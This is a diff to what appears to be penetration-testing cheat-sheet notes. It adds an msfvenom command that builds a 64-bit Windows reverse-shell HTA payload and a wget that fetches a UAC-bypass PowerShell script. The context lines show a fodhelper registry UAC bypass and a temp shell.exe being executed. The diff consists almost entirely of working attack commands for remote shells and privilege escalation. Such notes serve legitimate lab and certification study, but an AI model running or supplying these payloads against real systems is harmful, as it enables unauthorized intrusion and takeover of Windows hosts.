@@ -75,6 +75,7 @@ cmd /c C:\\Windows\\temp\\shell.exe
 We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
 ````
 msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
 ````
 ### Hashing & Cracking
 #### Enumeration
@@ -362,6 +363,9 @@ C:\Windows\SysNative\fodhelper.exe #64 bit
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+````
+````
+wget https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1 
 ````
 
 
